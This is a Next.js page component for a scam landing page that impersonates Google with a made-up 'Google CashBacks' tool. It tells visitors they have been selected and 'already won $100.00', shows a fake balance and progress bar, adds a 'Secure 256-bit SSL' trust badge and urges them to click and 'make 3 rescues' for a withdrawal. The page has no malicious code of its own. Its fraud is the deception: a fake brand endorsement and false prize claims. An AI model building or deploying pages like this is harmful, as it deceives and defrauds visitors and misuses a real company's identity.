import Button from "@/components/button";
import { useLayer } from "@/context/layer-provider";
import Image from "next/image";
import { Wallet, CheckCircle2 } from "lucide-react";

export default function Page() {

  // IMPORT CONTEXT DATA
  const { active, handleButtonClick } = useLayer();

  return (
    <div className="flex flex-col min-h-screen bg-gray-100 font-sans selection:bg-green-100 pb-10">

      {/* COMPACT HEADER */}
      <div className="bg-white py-2 px-4 shadow-md sticky top-0 z-50 flex items-center justify-between h-14">
        <div className="flex items-center gap-1.5 opacity-90 hover:opacity-100 transition-opacity">
          <Image
            src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"
            alt="Google"
            width={75}
            height={24}
            className="w-[75px] h-auto object-contain"
            unoptimized
          />
          <div className="h-5 w-px bg-gray-300 mx-1"></div>
          <span className="text-gray-600 text-sm font-semibold tracking-tight mt-0.5">CashBacks</span>
        </div>

        <div className="bg-gradient-to-r from-[#34A853] to-[#2E8B46] text-white pl-2.5 pr-3 py-1.5 rounded-full shadow-sm shadow-green-100 flex items-center gap-2">
          <div className="p-1 bg-white/20 rounded-full">
            <Wallet size={12} className="text-white" />
          </div>
          <span className="font-bold text-sm tracking-wide">$ 100.00</span>
        </div>
      </div>

      {/* SUB-HEADER INFO */}
      <div className="bg-[#e8f0fe] py-3 px-4 border-b border-blue-100 mb-4 shadow-sm">
        <p className="text-blue-800 text-xs text-center font-medium leading-relaxed max-w-lg mx-auto">
          Google CashBacks needs you to recover cashbacks that are being forgotten every day by thousands of people.
        </p>
      </div>

      {/* PROGRESS SECTION */}
      <div className="px-6 mt-2 mb-4">
        <div className="flex justify-between text-xs font-bold text-gray-500 mb-2 uppercase tracking-wider">
          <span>Your Progress</span>
          <span className="text-green-700">0%</span>
        </div>
        <div className="w-full bg-gray-300 h-3 rounded-full overflow-hidden shadow-inner border border-gray-200">
          <div className="bg-[#34A853] h-full w-[2%] rounded-full"></div>
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div className="flex-1 px-4 mt-2 flex flex-col items-center">
        <div className="w-full max-w-md bg-white rounded-3xl shadow-[0_8px_30px_rgb(0,0,0,0.08)] p-6 sm:p-8 text-center border border-gray-100 relative overflow-hidden">

          <div className="relative">

            <h1 className="text-2xl font-bold text-gray-800 mb-4 leading-tight">
              Congratulations! <br /> You have been selected!
            </h1>

            <p className="text-gray-600 text-sm mb-6 leading-relaxed px-2">
              You just received access to the new Google tool to recover Cashbacks.
            </p>

            <div className="bg-[#E6F4EA] border border-[#a8dab5] rounded-xl p-4 mb-6 shadow-sm">
              <p className="text-[#137333] font-bold text-lg leading-tight">
                Take advantage, <br /> you already won $100.00!
              </p>
            </div>

            <div className="space-y-1 mb-8">
              <p className="text-gray-800 font-semibold text-sm">
                Make 3 rescues and make your first withdrawal in minutes!
              </p>
              <p className="text-gray-500 text-xs mt-2">
                Click the button below and start now
              </p>
            </div>

            <Button
              active={active}
              onClick={handleButtonClick}
              className="!w-full !rounded-xl !bg-[#34A853] !text-white !font-bold !text-base !py-4 !shadow-green-200 !shadow-lg hover:!translate-y-[-2px] hover:!shadow-xl transition-all uppercase tracking-wide"
            >
              CLICK HERE AND START!
            </Button>
          </div>

        </div>

        {/* Footer Trust Elements */}
        <div className="mt-8 flex items-center gap-4 opacity-50 grayscale">
          <Image src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" width={60} height={20} unoptimized />
          <div className="h-4 w-px bg-gray-400"></div>
          <span className="text-xs font-semibold text-gray-500">Secure 256-bit SSL</span>
        </div>
      </div>

    </div>
  );
};